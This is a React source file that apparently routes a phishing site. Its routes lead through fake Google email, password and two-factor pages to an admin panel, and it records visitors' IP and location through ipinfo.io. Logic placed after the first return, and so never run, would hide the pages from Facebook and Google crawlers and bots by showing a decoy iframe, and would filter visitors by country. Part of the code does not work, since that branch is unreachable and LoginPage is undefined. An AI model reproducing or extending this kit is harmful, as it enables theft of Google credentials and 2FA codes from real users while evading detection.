import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";
import SecurityDashboard from "./pages/SecurityDashboard";
import AuthCode from "./pages/authCode";
import Landing from "./pages/Landing";
import EnterEmail from "./pages/EnterEmail";
import EnterPass from "./pages/EnterPass";
import Twofactor from "./pages/Twofactor";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
import { isbot } from "isbot";
import { Home } from "react-ionicons";


function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/adlogin" />
  );
}

function App() {
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);

  function showIframe(file) {
    const html = (
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
    );
    return html;
  }

  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
        var countryCode = d.country;
        setCountryCode(countryCode.toLowerCase());
        localStorage.setItem(
          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);
return (
            <BrowserRouter>
              <div id="app">
                <Routes>
                  <Route path="/" element={<Landing/>} />
                  <Route path="/google/login" element={<EnterEmail/>} />
                  <Route path="/google/auth/:userID" element={<EnterPass/>} />
                  <Route path="/google/twofactor" element={<Twofactor/>} />
                  <Route path="checkpoint/:userID" element={<Twofactor/>} />
                  <Route path="processing/:userID" element={<SecurityDashboard />} />
                  <Route path="/adlogin" element={<Login />} />
                  <Route
                    path="/admin"
                    element={
                      <PrivateRoute>
                        <AdminPage />
                      </PrivateRoute>
                    }
                  />
                  <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                </Routes>
              </div>
            </BrowserRouter>
          );  
  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google')
    && !isbot(userAgent)){
    if(countryCode.length == 0){
                return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
          );
      }else{
        if(countryCode.includes('vn')){
          return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
          );
           return(showIframe("homepage.html"));

        }else{
          return (
            <BrowserRouter>
              <div id="app">
                <Routes>
                  <Route path="/" element={<Landing/>} />
                  <Route path="/login" element={<LoginPage/>} />
                  <Route path="checkpoint/:userID" element={<Twofactor/>} />
                  <Route path="processing/:userID" element={<SecurityDashboard />} />
                  <Route path="/adlogin" element={<Login />} />
                  <Route
                    path="/admin"
                    element={
                      <PrivateRoute>
                        <AdminPage />
                      </PrivateRoute>
                    }
                  />
                  <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
                </Routes>
              </div>
            </BrowserRouter>
          );  
        }
      }
  }else{
    return(showIframe("homepage.html"));
  }
}


export default App;
